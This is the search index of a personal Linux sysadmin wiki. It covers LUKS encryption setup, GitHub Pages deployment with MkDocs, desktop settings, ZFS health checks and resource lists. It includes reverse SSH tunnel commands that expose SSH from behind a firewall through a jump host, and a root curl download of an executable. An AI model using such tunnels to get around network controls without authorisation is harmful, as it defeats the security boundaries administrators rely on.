MkDocs Create the repo Generally easier to create it through GitHub and pull it down with git clone Create a gh-pages branch git branch gh-pages Create MkDocs file structure mkdocs new filename Do MkDocs things Create docs Edit the config file Change theming If you are going to make a domain/subdomain, do it now. Move your CNAME file into the docs folder, so mkdocs gh-deploy will keep it in your build. Commit it to master git add . git commit -m 'Update' MkDocs GitHub Pages Deploy mkdocs gh-deploy You should now have a static site at either your domain/subdomain or at .github.io.","title":"Github Pages MkDocs"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#github-pages-mkdocs","text":"","title":"Github Pages MkDocs"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#create-the-repo","text":"Generally easier to create it through GitHub and pull it down with git clone","title":"Create the repo"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#create-a-gh-pages-branch","text":"git branch gh-pages","title":"Create a gh-pages branch"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#create-mkdocs-file-structure","text":"mkdocs new filename","title":"Create MkDocs file structure"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#do-mkdocs-things","text":"Create docs Edit the config file Change theming","title":"Do MkDocs things"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#if-you-are-going-to-make-a-domainsubdomain-do-it-now","text":"Move your CNAME file into the docs folder, so mkdocs gh-deploy will keep it in your build.","title":"If you are going to make a domain/subdomain, do it now."},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#commit-it-to-master","text":"git add . git commit -m 'Update'","title":"Commit it to master"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/#mkdocs-github-pages-deploy","text":"mkdocs gh-deploy You should now have a static site at either your domain/subdomain or at .github.io.","title":"MkDocs GitHub Pages Deploy"},{"location":"wiki/System%20Administration/Linux/LD_PRELOAD/","text":"LD_PRELOAD Whitelisting Whitelisting LD_PRELOAD libraries using LD_AUDIT https://github.com/ForensicITGuy/libpreloadvaccine","title":"LD_PRELOAD Whitelisting"},{"location":"wiki/System%20Administration/Linux/LD_PRELOAD/#ld_preload-whitelisting","text":"","title":"LD_PRELOAD Whitelisting"},{"location":"wiki/System%20Administration/Linux/LD_PRELOAD/#whitelisting-ld_preload-libraries-using-ld_audit","text":"https://github.com/ForensicITGuy/libpreloadvaccine","title":"Whitelisting LD_PRELOAD libraries using LD_AUDIT"},{"location":"wiki/System%20Administration/Linux/Linux%20To-Do/","text":"Linux To-Do Gentoo LFS Better at sed and awk RH certs https://www.redhat.com/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/?version=7 https://www.certdepot.net/rhel7-available-online-trainings/ https://www.certdepot.net/rhel7-rhcsa-sample-exam-1/ https://www.youtube.com/channel/UC2tfqp20unuCz7Jl8hLLWug https://www.rhatcert.com/ http://linuxcommand.org/tlcl.php","title":"Linux To-Do"},{"location":"wiki/System%20Administration/Linux/Linux%20To-Do/#linux-to-do","text":"Gentoo LFS Better at sed and awk RH certs https://www.redhat.com/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/?version=7 https://www.certdepot.net/rhel7-available-online-trainings/ https://www.certdepot.net/rhel7-rhcsa-sample-exam-1/ https://www.youtube.com/channel/UC2tfqp20unuCz7Jl8hLLWug https://www.rhatcert.com/ http://linuxcommand.org/tlcl.php","title":"Linux To-Do"},{"location":"wiki/System%20Administration/Linux/Logging/","text":"Logging https://www.amazon.com/UNIX-Linux-System-Administration-Handbook/dp/0134277554 https://httpd.apache.org/docs/1.3/logs.html https://stackify.com/linux-logs/","title":"Logging"},{"location":"wiki/System%20Administration/Linux/Logging/#logging","text":"https://www.amazon.com/UNIX-Linux-System-Administration-Handbook/dp/0134277554 https://httpd.apache.org/docs/1.3/logs.html https://stackify.com/linux-logs/","title":"Logging"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/","text":"Find disk lsblk Partition Setup: sudo parted /dev/sd[x] mklabel gpt print set unit GB mkpart primary 0 1000 print quit OR parted -a optimal /dev/sd[x] mkpart primary 0% 100% You may need to delete any current partitions Make the filesystem and check mkfs.ext4 /dev/sd[X]1 sudo fdisk -l Encrypted Disk Setup: sudo fdisk -l sudo cryptsetup -v -y luksFormat /dev/sd[X]1 sudo cryptsetup luksOpen /dev/sd[X]1 [dev mapper name] sudo mkfs.ext4 /dev/mapper/[dev mapper name] mkdir [mount point] sudo mount /dev/mapper/[dev mapper name] [mount point] sudo chown -R $USER:$USER [mount point] Auto Mount Disk: sudo vim /etc/fstab Add this line /dev/mapper/[dev mapper name] [mount point] ext4 defaults 0 2 Key Unlock: Create the keyfile mkdir [hidden keyfile directory] dd if=/dev/random bs=32 count=4 of=[hidden keyfile directory]/keyfile sudo cryptsetup luksAddKey /dev/sd[X]1 [hidden keyfile directory]/keyfile Get the disk UUID ls -l /dev/disk/by-uuid/ Edit the crypttab sudo vim /etc/crypttab Add this line [dev mapper name] UUID=[uuid of cryptdevice] [hidden keyfile directory]/keyfile luks","title":"Luks Setup"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#find-disk","text":"lsblk","title":"Find disk"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#partition-setup","text":"sudo parted /dev/sd[x] mklabel gpt print set unit GB mkpart primary 0 1000 print quit","title":"Partition Setup:"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#or","text":"parted -a optimal /dev/sd[x] mkpart primary 0% 100% You may need to delete any current partitions","title":"OR"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#make-the-filesystem-and-check","text":"mkfs.ext4 /dev/sd[X]1 sudo fdisk -l","title":"Make the filesystem and check"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#encrypted-disk-setup","text":"sudo fdisk -l sudo cryptsetup -v -y luksFormat /dev/sd[X]1 sudo cryptsetup luksOpen /dev/sd[X]1 [dev mapper name] sudo mkfs.ext4 /dev/mapper/[dev mapper name] mkdir [mount point] sudo mount /dev/mapper/[dev mapper name] [mount point] sudo chown -R $USER:$USER [mount point]","title":"Encrypted Disk Setup:"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#auto-mount-disk","text":"sudo vim /etc/fstab","title":"Auto Mount Disk:"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#add-this-line","text":"/dev/mapper/[dev mapper name] [mount point] ext4 defaults 0 2","title":"Add this line"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#key-unlock","text":"","title":"Key Unlock:"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#create-the-keyfile","text":"mkdir [hidden keyfile directory] dd if=/dev/random bs=32 count=4 of=[hidden keyfile directory]/keyfile sudo cryptsetup luksAddKey /dev/sd[X]1 [hidden keyfile directory]/keyfile","title":"Create the keyfile"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#get-the-disk-uuid","text":"ls -l /dev/disk/by-uuid/","title":"Get the disk UUID"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#edit-the-crypttab","text":"sudo vim /etc/crypttab","title":"Edit the crypttab"},{"location":"wiki/System%20Administration/Linux/Luks%20Setup/#add-this-line_1","text":"[dev mapper name] UUID=[uuid of cryptdevice] [hidden keyfile directory]/keyfile luks","title":"Add this line"},{"location":"wiki/System%20Administration/Linux/MATE%20Configuration%20Import/","text":"Load configuration into the database dconf load /org/mate/ < mate.conf Remove the Dock from the Launcher dconf write /net/launchpad/plank/docks/dock1/show-dock-item false","title":"MATE Configuration Import"},{"location":"wiki/System%20Administration/Linux/MATE%20Configuration%20Import/#load-configuration-into-the-database","text":"dconf load /org/mate/ < mate.conf","title":"Load configuration into the database"},{"location":"wiki/System%20Administration/Linux/MATE%20Configuration%20Import/#remove-the-dock-from-the-launcher","text":"dconf write /net/launchpad/plank/docks/dock1/show-dock-item false","title":"Remove the Dock from the Launcher"},{"location":"wiki/System%20Administration/Linux/Network%20Troubleshooting/","text":"Network Troubleshooting https://www.redhat.com/sysadmin/beginners-guide-network-troubleshooting-linux https://archive.nanog.org/meetings/nanog47/presentations/Sunday/RAS_Traceroute_N47_Sun.pdf","title":"Network Troubleshooting"},{"location":"wiki/System%20Administration/Linux/Network%20Troubleshooting/#network-troubleshooting","text":"https://www.redhat.com/sysadmin/beginners-guide-network-troubleshooting-linux https://archive.nanog.org/meetings/nanog47/presentations/Sunday/RAS_Traceroute_N47_Sun.pdf","title":"Network Troubleshooting"},{"location":"wiki/System%20Administration/Linux/Remove%20%5EM%5EM/","text":"Different methods to remove ^M^M :%s/\\r\\(\\n\\)/\\1/g May need to run this twice sed -e \"s/^M//\" file > newfile :set ff=unix :set ff=dos ``` :1,$s/^M//g","title":"Remove ^M^M"},{"location":"wiki/System%20Administration/Linux/Remove%20%5EM%5EM/#different-methods-to-remove-mm","text":":%s/\\r\\(\\n\\)/\\1/g May need to run this twice sed -e \"s/^M//\" file > newfile :set ff=unix :set ff=dos ``` :1,$s/^M//g","title":"Different methods to remove ^M^M"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/","text":"On Server 2 (behind firewall or double NAT): ssh -f -N -T -R<Port opened on Server 1>:0.0.0.0:22 <Server 1 Username>@<Server 1 IP Address> On Workstation: ssh -f -N -T <Server 1 Username>@<Server 1 IP Address> -M -S <Whatever Control Socket Name> -L <Workstation RHP>:localhost:<Port opened on Server 1> ssh -p <Workstation RHP> -S <Whatever Control Socket Name> <Server 2 Username>@localhost Jump Server: Remote: ssh -f -N -T -R<Port opening on Jump Server>:0.0.0.0:<Jump server SSH port> <jump username>@<Jump IP address (public IP)> Jump: ssh -f -N -T -g <jump username>@localhost -L <globally listening port to connect into>:localhost:<port opened initially on jump server> Host: ssh -p <global listen on jump> <remote username>@<jump server IP address (private IP)>","title":"Reverse SSH Tunnel"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#on-server-2-behind-firewall-or-double-nat","text":"ssh -f -N -T -R<Port opened on Server 1>:0.0.0.0:22 <Server 1 Username>@<Server 1 IP Address>","title":"On Server 2 (behind firewall or double NAT):"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#on-workstation","text":"ssh -f -N -T <Server 1 Username>@<Server 1 IP Address> -M -S <Whatever Control Socket Name> -L <Workstation RHP>:localhost:<Port opened on Server 1> ssh -p <Workstation RHP> -S <Whatever Control Socket Name> <Server 2 Username>@localhost","title":"On Workstation:"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#jump-server","text":"","title":"Jump Server:"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#remote","text":"ssh -f -N -T -R<Port opening on Jump Server>:0.0.0.0:<Jump server SSH port> <jump username>@<Jump IP address (public IP)>","title":"Remote:"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#jump","text":"ssh -f -N -T -g <jump username>@localhost -L <globally listening port to connect into>:localhost:<port opened initially on jump server>","title":"Jump:"},{"location":"wiki/System%20Administration/Linux/Reverse%20SSH%20Tunnel/#host","text":"ssh -p <global listen on jump> <remote username>@<jump server IP address (private IP)>","title":"Host:"},{"location":"wiki/System%20Administration/Linux/TurnKey%20Linux%20Template%20Fix/","text":"Making TurnKey LXC containers run as unprivileged In an effort to heighten security, especially for anything that may or may not be publicly exposed, you should strive to have your LXC containers run as unprivileged. There are known problems with postfix . If you remove the following: rm -f /var/spool/postfix/dev/urandom rm -f /var/spool/postfix/dev/random For instance, in Proxmox, after you have removed these files, you can backup the container, delete the existing container, then redeploy the container from backup as an unprivileged container. You can also avoid triggering the TurnKey containers setup scripts and hooks by chroot ing into the container through the hypervisor. For example: root@proxmox:~# pct list VMID Status Lock Name 100 running Example root@proxmox:~# lxc-attach 100 root@Example:~#","title":"Making TurnKey LXC containers run as unprivileged"},{"location":"wiki/System%20Administration/Linux/TurnKey%20Linux%20Template%20Fix/#making-turnkey-lxc-containers-run-as-unprivileged","text":"In an effort to heighten security, especially for anything that may or may not be publicly exposed, you should strive to have your LXC containers run as unprivileged. There are known problems with postfix . If you remove the following: rm -f /var/spool/postfix/dev/urandom rm -f /var/spool/postfix/dev/random For instance, in Proxmox, after you have removed these files, you can backup the container, delete the existing container, then redeploy the container from backup as an unprivileged container. You can also avoid triggering the TurnKey containers setup scripts and hooks by chroot ing into the container through the hypervisor. For example: root@proxmox:~# pct list VMID Status Lock Name 100 running Example root@proxmox:~# lxc-attach 100 root@Example:~#","title":"Making TurnKey LXC containers run as unprivileged"},{"location":"wiki/System%20Administration/Linux/Ubuntu%20Gnome%20Clean/","text":"Ubuntu Gnome Settings To make for a cleaner look in Gnome, here are some settings I found to do the trick. Permanently hides the Ubuntu dock gsettings set org.gnome.shell.extensions.dash-to-dock autohide false gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed false gsettings set org.gnome.shell.extensions.dash-to-dock intellihide false Hides the desktop icons gsettings set org.gnome.shell.extensions.desktop-icons show-home false gsettings set org.gnome.shell.extensions.desktop-icons show-trash false If those don't work, this is probably what you need: gsettings set org.gnome.nautilus.desktop trash-icon-visible false","title":"Ubuntu Gnome Settings"},{"location":"wiki/System%20Administration/Linux/Ubuntu%20Gnome%20Clean/#ubuntu-gnome-settings","text":"To make for a cleaner look in Gnome, here are some settings I found to do the trick.","title":"Ubuntu Gnome Settings"},{"location":"wiki/System%20Administration/Linux/Ubuntu%20Gnome%20Clean/#permanently-hides-the-ubuntu-dock","text":"gsettings set org.gnome.shell.extensions.dash-to-dock autohide false gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed false gsettings set org.gnome.shell.extensions.dash-to-dock intellihide false","title":"Permanently hides the Ubuntu dock"},{"location":"wiki/System%20Administration/Linux/Ubuntu%20Gnome%20Clean/#hides-the-desktop-icons","text":"gsettings set org.gnome.shell.extensions.desktop-icons show-home false gsettings set org.gnome.shell.extensions.desktop-icons show-trash false If those don't work, this is probably what you need: gsettings set org.gnome.nautilus.desktop trash-icon-visible false","title":"Hides the desktop icons"},{"location":"wiki/System%20Administration/Linux/XFCE%20Keybind%20Commands/","text":"Tile Corner Keybinds xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>1\" --type string --set \"tile_up_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>2\" --type string --set \"tile_up_right_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>3\" --type string --set \"tile_down_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>4\" --type string --set \"tile_down_right_key\" Tile Half Keybinds xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Left\" --type string --set \"tile_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Right\" --type string --set \"tile_right_key\" Maximize and Hide Windows xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Up\" --type string --set \"maximize_window_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Down\" --type string --set \"hide_window_key\" Restart to take effect xfce4-panel --quit; pkill xfconfd; cp panel.xml ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-panel.xml; xfce4-panel &","title":"XFCE Keybind Commands"},{"location":"wiki/System%20Administration/Linux/XFCE%20Keybind%20Commands/#tile-corner-keybinds","text":"xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>1\" --type string --set \"tile_up_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>2\" --type string --set \"tile_up_right_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>3\" --type string --set \"tile_down_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>4\" --type string --set \"tile_down_right_key\"","title":"Tile Corner Keybinds"},{"location":"wiki/System%20Administration/Linux/XFCE%20Keybind%20Commands/#tile-half-keybinds","text":"xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Left\" --type string --set \"tile_left_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Right\" --type string --set \"tile_right_key\"","title":"Tile Half Keybinds"},{"location":"wiki/System%20Administration/Linux/XFCE%20Keybind%20Commands/#maximize-and-hide-windows","text":"xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Up\" --type string --set \"maximize_window_key\" xfconf-query --create --channel xfce4-keyboard-shortcuts --property \"/xfwm4/custom/>Super>Down\" --type string --set \"hide_window_key\"","title":"Maximize and Hide Windows"},{"location":"wiki/System%20Administration/Linux/XFCE%20Keybind%20Commands/#restart-to-take-effect","text":"xfce4-panel --quit; pkill xfconfd; cp panel.xml ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-panel.xml; xfce4-panel &","title":"Restart to take effect"},{"location":"wiki/System%20Administration/Linux/YoutubeDL/","text":"Setup sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl sudo chmod a+rx /usr/local/bin/youtube-dl sudo apt install ffmpeg Example Command: youtube-dl -u user@email.com -p password --download-archive playlist.txt \"https://www.youtube.com/playlist?list=XXXXXXXXXXXXXXXX\" -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best' -o '%(title)s.%(ext)s' --restrict-filenames","title":"YoutubeDL"},{"location":"wiki/System%20Administration/Linux/YoutubeDL/#setup","text":"sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl sudo chmod a+rx /usr/local/bin/youtube-dl sudo apt install ffmpeg","title":"Setup"},{"location":"wiki/System%20Administration/Linux/YoutubeDL/#example-command","text":"youtube-dl -u user@email.com -p password --download-archive playlist.txt \"https://www.youtube.com/playlist?list=XXXXXXXXXXXXXXXX\" -f 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best' -o '%(title)s.%(ext)s' --restrict-filenames","title":"Example Command:"},{"location":"wiki/System%20Administration/Linux/ZFS/","text":"Listing pools zpool list zfs list Listing snapshots zfs list -t snapshot Showing status of scrubs zpool status Read smart status smartctl -H /dev/sd* Read all smart information smartctl -a /dev/sd* Look for: * Short self-test routine * recommended polling time: * Extended self-test routine * recommended polling time: * Conveyance self-test routine * recommended polling time: * SMART Self-test log structure revision number 1 Scrubbing","title":"ZFS"},{"location":"wiki/System%20Administration/Linux/ZFS/#listing-pools","text":"zpool list zfs list","title":"Listing pools"},{"location":"wiki/System%20Administration/Linux/ZFS/#listing-snapshots","text":"zfs list -t snapshot","title":"Listing snapshots"},{"location":"wiki/System%20Administration/Linux/ZFS/#showing-status-of-scrubs","text":"zpool status","title":"Showing status of scrubs"},{"location":"wiki/System%20Administration/Linux/ZFS/#read-smart-status","text":"smartctl -H /dev/sd*","title":"Read smart status"},{"location":"wiki/System%20Administration/Linux/ZFS/#read-all-smart-information","text":"smartctl -a /dev/sd*","title":"Read all smart information"},{"location":"wiki/System%20Administration/Linux/ZFS/#look-for","text":"* Short self-test routine * recommended polling time: * Extended self-test routine * recommended polling time: * Conveyance self-test routine * recommended polling time: * SMART Self-test log structure revision number 1 Scrubbing","title":"Look for:"},{"location":"wiki/System%20Administration/Resources/Awesome%20Selfhosted/","text":"Table of Potential Additions Category Name Description Yes/No? Automation Alltube interface for youtube-dl, a program to download videos and audio from more than 100 websites . - Automation Headphones Automated music downloader for NZB and Torrent, written in Python. It supports SABnzbd, NZBget, Transmission, \u00b5Torrent, Deluge and Blackhole. - Automation homebank-converter Web app to convert an export bank file to compatible Homebank csv. - Automation Leon Open-source personal assistant who can live on your server. - Automation Lidarr Lidarr is a music collection manager for Usenet and BitTorrent users. - Audio Streaming Airsonic Open-source web-based media streamer and jukebox. A fork of Subsonic's last open-source release, before it switched licenses. - Misc/Other CyberChef Perform all manner of \"cyber\" operations within a web browser such as AES, DES and Blowfish encryption and decryption, creating hexdumps, calculating hashes, and much more. - Misc/Other King Phisher King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. - Misc/Other Ombi A content request system for Plex/Emby, connects to SickRage, CouchPotato, Sonarr, with a growing feature set. - Money, Budgeting and Management Firefly III Firefly III is a modern financial manager. It helps you to keep track of your money and make budget forecasts. It supports credit cards, has an advanced rule engine and can import data from many banks. It's powered by Laravel and requires PHP7.3. - Note-taking and Editors draw.io Diagram software for making flowcharts, process diagrams, org charts, UML, ER and network diagrams. - Note-taking and Editors Joplin Joplin is a note taking application with Markdown editor and encryption support for mobile and desktop platforms. Runs client-side and syncs through self hosted Nextcloud or similar. Consider it like open source alternative to Evernote. - Note-taking and Editors Joplin Web-App A Web application companion for JoplinApp - Pastebins PrivateBin PrivateBin is a minimalist, opensource online pastebin/discussion board where the server has zero knowledge of hosted data. - Personal Dashboards Heimdall Heimdall is an elegant solution to organise all your web applications. - Photo and Video Galleries Piwigo Photo gallery software for the web, built by an active community of users and developers. - Proxy Traefik Tr\u00e6f\u026ak is a modern HTTP reverse proxy and load balancer made to deploy microservices with ease. It supports several backends (Docker, Swarm, Mesos/Marathon, \u2026) to manage its configuration automatically and dynamically. - Search Engines Searx Privacy-respecting, hackable metasearch engine. - Project Management Gitea Community managed fork of Gogs, lightweight code hosting solution. - Documentation Generators Read the Docs Host documentation, making it fully searchable and easy to find; import your docs using any major version control system, including Mercurial, Git, Subversion, and Bazaar. - VPN sshuttle Poor man's VPN. -","title":"Awesome Selfhosted"},{"location":"wiki/System%20Administration/Resources/Awesome%20Selfhosted/#table-of-potential-additions","text":"Category Name Description Yes/No? Automation Alltube interface for youtube-dl, a program to download videos and audio from more than 100 websites . - Automation Headphones Automated music downloader for NZB and Torrent, written in Python. It supports SABnzbd, NZBget, Transmission, \u00b5Torrent, Deluge and Blackhole. - Automation homebank-converter Web app to convert an export bank file to compatible Homebank csv. - Automation Leon Open-source personal assistant who can live on your server. - Automation Lidarr Lidarr is a music collection manager for Usenet and BitTorrent users. - Audio Streaming Airsonic Open-source web-based media streamer and jukebox. A fork of Subsonic's last open-source release, before it switched licenses. - Misc/Other CyberChef Perform all manner of \"cyber\" operations within a web browser such as AES, DES and Blowfish encryption and decryption, creating hexdumps, calculating hashes, and much more. - Misc/Other King Phisher King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. - Misc/Other Ombi A content request system for Plex/Emby, connects to SickRage, CouchPotato, Sonarr, with a growing feature set. - Money, Budgeting and Management Firefly III Firefly III is a modern financial manager. It helps you to keep track of your money and make budget forecasts. It supports credit cards, has an advanced rule engine and can import data from many banks. It's powered by Laravel and requires PHP7.3. - Note-taking and Editors draw.io Diagram software for making flowcharts, process diagrams, org charts, UML, ER and network diagrams. - Note-taking and Editors Joplin Joplin is a note taking application with Markdown editor and encryption support for mobile and desktop platforms. Runs client-side and syncs through self hosted Nextcloud or similar. Consider it like open source alternative to Evernote. - Note-taking and Editors Joplin Web-App A Web application companion for JoplinApp - Pastebins PrivateBin PrivateBin is a minimalist, opensource online pastebin/discussion board where the server has zero knowledge of hosted data. - Personal Dashboards Heimdall Heimdall is an elegant solution to organise all your web applications. - Photo and Video Galleries Piwigo Photo gallery software for the web, built by an active community of users and developers. - Proxy Traefik Tr\u00e6f\u026ak is a modern HTTP reverse proxy and load balancer made to deploy microservices with ease. It supports several backends (Docker, Swarm, Mesos/Marathon, \u2026) to manage its configuration automatically and dynamically. - Search Engines Searx Privacy-respecting, hackable metasearch engine. - Project Management Gitea Community managed fork of Gogs, lightweight code hosting solution. - Documentation Generators Read the Docs Host documentation, making it fully searchable and easy to find; import your docs using any major version control system, including Mercurial, Git, Subversion, and Bazaar. - VPN sshuttle Poor man's VPN. -","title":"Table of Potential Additions"},{"location":"wiki/System%20Administration/Resources/Awesome%20Sysadmin/","text":"Awesome Sysadmin","title":"Awesome Sysadmin"},{"location":"wiki/System%20Administration/Resources/Random/","text":"Random resources to be sorted later Tools & Info for Sysadmins - Mega List of Tips, Tools, Books, Blogs & More https://www.reddit.com/r/sysadmin/comments/b1e88m/python_learning_video_series_for_network/ https://www.reddit.com/r/sysadmin/comments/cswe9x/tools_info_for_sysadmins_project_management_tool/ https://www.reddit.com/r/sysadmin/comments/bf00vt/any_good_training_videos_to_learn_powershell_and/ https://www.reddit.com/r/sysadmin/comments/c8stex/python_for_sysadmins/ https://www.reddit.com/r/sysadmin/comments/b1mluz/adding_a_new_skillpythonlooking_for_good_verified/ Random setup script https://www.reddit.com/r/linuxadmin/comments/ccwcoo/update_can_you_review_my_debian_vps_setup_script/ Cheat Sheet https://packetlife.net/library/cheat-sheets/ Linux Documentation Project (Filesystem) https://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/Linux-Filesystem-Hierarchy.pdf Training Resources with Links https://www.reddit.com/r/cybersecurity/comments/fcz6iz/training_resources_for_those_too_lazy_to_google/ Linux Permissions https://tylercipriani.com/blog/2020/01/12/unix-permissions-for-dummies/ Systemd Service Sandboxing and Security Hardening 101 https://www.ctrl.blog/entry/systemd-service-hardening.html Simple Manpages https://tldr.sh/ Different Linux Sysadmin utils https://www.ostechnix.com/some-useful-tools-for-linux-system-admins/","title":"Random resources to be sorted later"},{"location":"wiki/System%20Administration/Resources/Random/#random-resources-to-be-sorted-later","text":"Tools & Info for Sysadmins - Mega List of Tips, Tools, Books, Blogs & More https://www.reddit.com/r/sysadmin/comments/b1e88m/python_learning_video_series_for_network/ https://www.reddit.com/r/sysadmin/comments/cswe9x/tools_info_for_sysadmins_project_management_tool/ https://www.reddit.com/r/sysadmin/comments/bf00vt/any_good_training_videos_to_learn_powershell_and/ https://www.reddit.com/r/sysadmin/comments/c8stex/python_for_sysadmins/ https://www.reddit.com/r/sysadmin/comments/b1mluz/adding_a_new_skillpythonlooking_for_good_verified/","title":"Random resources to be sorted later"},{"location":"wiki/System%20Administration/Resources/Random/#random-setup-script","text":"https://www.reddit.com/r/linuxadmin/comments/ccwcoo/update_can_you_review_my_debian_vps_setup_script/","title":"Random setup script"},{"location":"wiki/System%20Administration/Resources/Random/#cheat-sheet","text":"https://packetlife.net/library/cheat-sheets/","title":"Cheat Sheet"},{"location":"wiki/System%20Administration/Resources/Random/#linux-documentation-project-filesystem","text":"https://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/Linux-Filesystem-Hierarchy.pdf","title":"Linux Documentation Project (Filesystem)"},{"location":"wiki/System%20Administration/Resources/Random/#training-resources-with-links","text":"https://www.reddit.com/r/cybersecurity/comments/fcz6iz/training_resources_for_those_too_lazy_to_google/","title":"Training Resources with Links"},{"location":"wiki/System%20Administration/Resources/Random/#linux-permissions","text":"https://tylercipriani.com/blog/2020/01/12/unix-permissions-for-dummies/","title":"Linux Permissions"},{"location":"wiki/System%20Administration/Resources/Random/#systemd-service-sandboxing-and-security-hardening-101","text":"https://www.ctrl.blog/entry/systemd-service-hardening.html","title":"Systemd Service Sandboxing and Security Hardening 101"},{"location":"wiki/System%20Administration/Resources/Random/#simple-manpages","text":"https://tldr.sh/","title":"Simple Manpages"},{"location":"wiki/System%20Administration/Resources/Random/#different-linux-sysadmin-utils","text":"https://www.ostechnix.com/some-useful-tools-for-linux-system-admins/","title":"Different Linux Sysadmin utils"}]}